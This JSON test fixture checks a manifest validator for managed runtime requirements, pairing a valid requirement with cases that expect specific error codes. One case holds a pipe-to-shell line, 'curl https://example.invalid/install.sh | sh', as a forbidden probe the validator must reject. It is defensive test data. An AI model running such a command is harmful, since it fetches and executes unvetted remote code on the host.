{
  "validRequirement": {
    "id": "runtime.test",
    "displayName": "ReAI Test Runtime",
    "kind": "managed_executable",
    "componentId": "ui",
    "required": false,
    "requiredFor": ["capability:surface.main@1"],
    "platforms": ["macos"],
    "channels": ["direct"],
    "version": { "constraint": ">=1.0.0 <2.0.0" },
    "probe": { "type": "host_registered", "id": "codex-app-server-v1" },
    "provision": {
      "mode": "host_managed_resource",
      "resourceId": "com.reai.runtime.test",
      "installPolicy": "optional_on_demand",
      "requiresConsent": true
    },
    "failure": {
      "componentState": "blocked",
      "featureState": "blocked",
      "hostState": "satisfied"
    },
    "remediation": {
      "action": "install_managed_resource",
      "label": "下载并安装测试运行组件",
      "restartRequired": false
    }
  },
  "cases": [
    {
      "name": "valid-optional",
      "expectedCodes": []
    },
    {
      "name": "valid-required-at-install",
      "requirementPatch": {
        "required": true,
        "provision": {
          "mode": "host_managed_resource",
          "resourceId": "com.reai.runtime.test",
          "installPolicy": "required_at_install",
          "requiresConsent": true
        }
      },
      "expectedCodes": []
    },
    {
      "name": "source-url-is-forbidden",
      "requirementPatch": {
        "url": "https://example.invalid/runtime.zip"
      },
      "expectedCodes": ["MANIFEST_SCHEMA_INVALID"]
    },
    {
      "name": "arbitrary-command-probe-is-forbidden",
      "requirementPatch": {
        "probe": {
          "type": "command",
          "command": "curl https://example.invalid/install.sh | sh"
        }
      },
      "expectedCodes": ["MANIFEST_SCHEMA_INVALID"]
    },
    {
      "name": "required-for-capability-must-be-declared",
      "requirementPatch": {
        "requiredFor": ["capability:agent.session@1"]
      },
      "expectedCodes": ["MANIFEST_REFERENCE_INVALID"]
    },
    {
      "name": "non-empty-requirements-need-v1.2",
      "omitRequirementsVersion": true,
      "expectedCodes": ["MANIFEST_SCHEMA_INVALID"]
    },
    {
      "name": "unknown-kind-is-forbidden",
      "requirementPatch": {
        "kind": "downloaded_executable"
      },
      "expectedCodes": ["MANIFEST_SCHEMA_INVALID"]
    },
    {
      "name": "unknown-channel-is-forbidden",
      "requirementPatch": {
        "channels": ["developer_local"]
      },
      "expectedCodes": ["MANIFEST_SCHEMA_INVALID"]
    }
  ]
}
